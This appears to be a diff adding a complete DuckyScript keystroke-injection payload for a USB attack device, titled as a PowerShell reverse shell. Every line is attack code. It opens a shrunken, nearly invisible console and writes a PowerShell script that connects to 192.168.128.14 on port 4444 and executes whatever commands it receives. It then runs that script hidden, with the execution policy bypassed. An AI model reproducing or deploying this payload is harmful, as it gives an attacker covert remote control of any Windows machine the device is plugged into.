@@ -1,0 +1,16 @@
+REM Powershell Reverse Shell
+DELAY 6000
+GUI r
+DELAY 100
+STRING cmd
+ENTER
+DELAY 1000
+STRING mode con:cols=18 lines=1
+ENTER
+STRING echo Param([string]$IP,[string]$PORT);$client = New-Object System.Net.Sockets.TCPClient("$IP",$PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..255^|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2^>^&1 ^| Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()>%temp%\shell.ps1
+ENTER
+DELAY 50
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "& '%temp%\shell.ps1' 192.168.128.14 4444"
+ENTER
+STRING exit
+ENTER
